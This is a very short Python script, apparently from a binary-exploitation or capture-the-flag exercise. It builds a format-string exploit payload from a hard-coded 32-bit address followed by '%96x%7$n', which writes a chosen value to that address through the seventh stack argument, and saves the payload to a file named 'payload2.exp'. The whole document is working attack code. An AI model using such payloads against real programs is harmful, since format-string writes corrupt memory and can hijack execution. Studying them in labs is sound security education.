payload = b"\x2c\xa0\x04\x08"
payload += b"%96x" + b"%7$n"

f = open("payload2.exp", "wb")
f.write(payload)